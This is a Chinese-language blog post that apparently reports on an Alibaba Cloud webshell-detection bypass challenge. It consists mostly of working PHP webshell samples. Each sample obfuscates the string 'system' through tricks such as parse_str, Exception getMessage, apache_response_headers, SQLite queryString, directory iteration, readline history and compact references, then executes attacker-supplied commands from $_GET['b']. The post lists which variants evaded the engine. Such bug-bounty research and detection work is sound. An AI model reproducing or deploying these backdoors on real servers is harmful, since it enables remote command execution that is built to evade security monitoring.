# 记一次Webshell检测引擎绕过测试 - 跳跳糖
[背景](#toc_)
-----------

前几天阿里云开启了伏魔赏金计划第二期-WebShell绕过挑战赛，正好没事便报名参加了。这是我第一次参加这种Webshell绕过比赛，因此我对成功绕过的样本做了一些总结，写下了这篇文章。

[基本思路](#toc__1)
---------------

我在上传了一些样本做测试后，我发现引擎(指伏魔Webshell检测引擎)对函数和函数的参数具有一定的敏感性。例如，array_map函数，它的第一个参数是传入一个回调函数，第二个参数是传入一个数组，作为回调函数的参数，测试时出现了以下四种情况。(black指被引擎发现，white指绕过引擎)

`array_map('system', array('whoami')); black
array_map($_GET['a'], array('whoami')); black
array_map('var_dump', array('whoami')); white
array_map('system', array($_GET['a'])); black` 

于是我便有了猜测，引擎会对传入array_map的参数进行检测，在某种情况下，引擎对参数是否可被外部控制的检查力度不同。

然后我又尝试了register\_shutdown\_function，array\_walk，array\_filter等具有回调函数功能的函数进行测试。发现确实存在这一种情况，当传入的回调函数不是system，eval等危险函数，引擎是允许第二个参数可被外部控制的。

这时我找到了我的思路，就是洗白'system'，让'system'不被引擎检查出来。具体方法就是通过各种函数来获取字符串"system"。

[parse_str + 还原字符串](#toc_parse_str)
-----------------------------------

我定义了一个函数fun，传入一个数字，fun可以将数字451232还原为字符串"system"。

`function fun($a){
    $s = ['a','t','s', 'y', 'm', 'e', '/'];
    $tmp = "";
    while ($a>10) {
        $tmp .= $s[$a%10];
        $a = $a/10;
    }
    return $tmp.$s[$a];
}` 

但是这样还不够，我尝试将webshell文件命名为451232.php，并通过substr函数获取到数字451232，依旧失败。

在不断尝试中，我找到了一个函数parse\_str，它可以将字符串解析成多个变量。例如"first=value&arr\[\]=foo+bar&arr\[\]=baz"，在经过parse\_str解析后，会得到一个数组，你可以通过$arr\[first\]访问到字符串"value"。于是我成功得到了一个绕过样本。

`function fun($a){
    $s = ['a','t','s', 'y', 'm', 'e', '/'];
    $tmp = "";
    while ($a>10) {
        $tmp .= $s[$a%10];
        $a = $a/10;
    }
    return $tmp.$s[$a];
}

$f = 'a=d&b[]=foo&b[]=' . fun(intval(substr(__FILE__, -10, 6)));
$arr = array();

parse_str($f, $arr);

$arr['b'][1]($_GET['b']);` 

[Exception::getMessage + 还原字符串 绕过](#toc_exceptiongetmessage)
------------------------------------------------------------

之前在一篇文章中，我看到了利用Exception的getMessage方法来绕过webshell检测，于是我便尝试仿照这个思路来构造绕过。在尝试了几个Exception后，我找到了PDOException，可以成功绕过引擎。

`<?php 
function fun($a){
//fun可以将数字451232还原为字符串"system"
    $s = ['a','t','s', 'y', 'm', 'e', '/'];
    $tmp = "";
    while ($a>10) {
        $tmp .= $s[$a%10];
        $a = $a/10;
    }
    return $tmp.$s[$a];
}

$a = new PDOException(fun(intval(substr(__FILE__, -10, 6))));
// $a = new PDOException('system'); 这种会被引擎检测出来

$b=$a->getMessage();
$b($_GET['b']);` 

然后，我通过正则表达式在5.6.40和7.1.33的php源码中，找到了几个同样可以绕过的Exception。

`DOMException
ReflectionException
ClosedGeneratorException 7版本特有
PharException` 

其中，ClosedGeneratorException是在7.1.33源码中找到的，是7版本特有的。

apache\_response\_headers是apache特供的函数，可以获取所有HTTP响应头。于是我利用header()自定义响应头，然后通过apache\_response\_headers拿到字符串"system"，成功绕过引擎。

`<?php
header('ddd: system');
$arr = apache_response_headers();
foreach($arr as $k=>$v){
    if (strlen($v) == 6 && $v[0] == 's' && $v[5] == 'm'){
        $v($_GET['b']);
    }
}` 

[从Sqlite数据库文件中获取"system"](#toc_sqlitesystem)
--------------------------------------------

我发现file\_put\_contents并不被引擎完全禁止，只要写入的文件名和文件内容不涉及webshell，实际上是可以正常写入的。于是我有了一个思路，我是不是可以写入一个sqlite数据库文件，然后使用php自带扩展sqlite，从数据库中读取到"system"。

于是我先构造出一个sqlite数据库，然后使用file\_get\_contents读取，并将内容进行base64编码后输出。进行base64编码是因为数据库文件内容存在一些特殊字符。

之后，我将这段编码后的数据写入wenshell，利用file\_put\_contents写入文件中，此时这个文件就变成一个可以被PDO识别的数据库文件。

数据库文件里可以不需要数据，只要有一个名为test的表就行了。因为我是利用PDO::prepare会返回一个PDOStatement对象，这个对象里有一个queryString属性，我使用substr从里面提取出"system"。

有一点需要注意，PDO::prepare是一个SQL语句预处理函数，然后没有正确连接数据库，以及库中没有正确的表，是不会返回PDOStatement对象的。

`<?php
$db_data = "[数据库文件base64编码]";

file_put_contents('./111', base64_decode($db_data));

$path = dirname(__FILE__) . $_GET['a'];

$db = new PDO("sqlite:" . $path);

$sql_stmt = $db->prepare('select * from test where name="system"');
$sql_stmt->execute();

$f = substr($sql_stmt->queryString, -7, 6);
$f($_GET['b']);` 

[从目录获取"system"](#toc_system)
----------------------------

FilesystemIterator是一个迭代器，可以获取到目标目录下的所有文件信息。于是我先使用file\_put\_contents写入一个名为"system"的文件，然后利用FilesystemIterator遍历目录，拿到字符串"system“，成功绕过引擎。

`<?php 
function fun($a){
//fun可以将数字451232还原为字符串"system"
    $s = ['a','t','s', 'y', 'm', 'e', '/'];
    $tmp = "";
    while ($a>10) {
        $tmp .= $s[$a%10];
        $a = $a/10;
    }
    return $tmp.$s[$a];
}
file_put_contents('./'.fun(intval(substr(__FILE__, -10, 6))).'.jntm', '');
$fi = new FilesystemIterator(dirname(__FILE__));
$f = '';
foreach($fi as $i){
    // var_dump($i->__toString());
    if (substr($i->__toString(), -4,4)=='jntm')
        $f = substr($i->__toString(), -11,6);
}
$f($_GET['b']);` 

除了FilesystemIterator，dir也有同样的效果，可以用来遍历目录信息。

`<?php 
function fun($a){
//fun可以将数字451232还原为字符串"system"
    $s = ['a','t','s', 'y', 'm', 'e', '/'];
    $tmp = "";
    while ($a>10) {
        $tmp .= $s[$a%10];
        $a = $a/10;
    }
    return $tmp.$s[$a];
}
file_put_contents('./'.fun(intval(substr(__FILE__, -10, 6))).'.jntm', '');
$objDir = dir(dirname(__FILE__));
$f = '';
while(($e=$objDir->read())!=FALSE){
    if (substr($e, -4,4)=='jntm')
        $f = substr($e, -11,6);
}
$f($_GET['b']);` 

在php中，可以遍历目录的方法还有scandir，opendir，glob，但这三个方法都绕不过引擎。

[5.4下的readline扩展绕过](#toc_54readline)
------------------------------------

php有一个扩展叫readline，可以处理命令行历史记录。readline\_add\_history函数可以添加一行到命令行历史记录。readline\_list\_history函数可以获取命令历史列表。

我利用readline\_add\_history函数将"system"添加到历史记录里，然后通过readline\_list\_history函数把system拿出来，以此来绕过引擎。

因为每执行一次readline\_add\_history，历史记录里就会多一个"system"，为了防止webshell的命令被执行多次，我写了一个flag变量，用来记录是否执行过。

`<?php 
function fun($a){
//fun可以将数字451232还原为字符串"system"
    $s = ['a','t','s', 'y', 'm', 'e', '/'];
    $tmp = "";
    while ($a>10) {
        $tmp .= $s[$a%10];
        $a = $a/10;
    }
    return $tmp.$s[$a];
}
readline_add_history(fun(intval(substr(__FILE__, -10, 6))));

$arr = readline_list_history();

$flag = 1;
foreach($arr as $a) {
    if ($flag && strlen($a)==6 && $a[0] == 's' && $a[5] == 'm') {
        $flag = 0; 
        $a($_GET['b']);
    }
}` 

此外，我还发现了两个函数，readline和readline\_info。readline\_info函数会返回一个数组，数组中下标为'prompt'的元素，其值为readline函数执行时传入的参数。于是我先执行readline('system')，然后通过readline_info()获取数组，根据下标'prompt'拿到"system"。

`<?php 
function fun($a){
//fun可以将数字451232还原为字符串"system"
    $s = ['a','t','s', 'y', 'm', 'e', '/'];
    $tmp = "";
    while ($a>10) {
        $tmp .= $s[$a%10];
        $a = $a/10;
    }
    return $tmp.$s[$a];
}
readline(fun(intval(substr(__FILE__, -10, 6))));
$a=readline_info()['prompt'];

$a($_GET['b']);` 

这两种绕过方式，我只在5.4版本的php下成功，5.5，5.6，7.1均失败。

[compact + 变量引用](#toc_compact)
------------------------------

compact创建一个包含变量名和它们的值的数组。举例。

`<?php
$firstname  =  "Bill";
$lastname  =  "Gates";
$age  =  "60";

$result  =  compact("firstname",  "lastname",  "age");

print_r($result);

//  输出
Array
(
  [firstname]  =>  Bill
  [lastname]  =>  Gates
  [age]  =>  60
)` 

于是我想到了先声明一个变量，并将值初始化为'system'，然后利用compact转换为数组，通过访问数组元素来获取system。但是这个方法行不通，绕不过引擎。

突然我想到了一个变量引用的技巧。当变量c变化时，数组a中key为'two'的元素也会跟着变化。

`$c = "222";
$a = array( "one"=>$c,"two"=>&$c );` 

既然compact可以将变量转换为数组，那变量引用是否对其有效呢？答案是无效的。

`$e = '111';
$city  = &$e;
$event = 'aaaa';

$result = compact("event", 'city');
$e = 'dddd';` 

虽然变量city引用了变量e，但是经过compact转换后，修改变量e是不会修改result中的city值。

在之前的测试中，已经确认数组使用变量引用的方法绕不过引擎，那么compact是否可以误导引擎认为我使用了变量引用呢？

我的思路是，将变量city引用变量e，然后使用compact将变量city转换为数组。在调用compact后，我将变量e进行修改为'dddd'。如果引擎对变量e进行跟踪，那么它会跟踪到变量e被赋值为'dddd'，这样一来，就会让引擎误以为result数组中city值为'dddd'，从而绕过引擎。

`<?php 
function fun($a){
    $s = ['a','t','s', 'y', 'm', 'e', '/'];
    $tmp = "";
    while ($a>10) {
        $tmp .= $s[$a%10];
        $a = $a/10;
    }
    return $tmp.$s[$a];
}
$e = fun(intval(substr(__FILE__,-10,6)));

$city  = &$e;
$event = 'aaaa';

$result = compact("event", "city");
$e = 'dddd';

$f = $result['city'];
$f($_GET['b']);`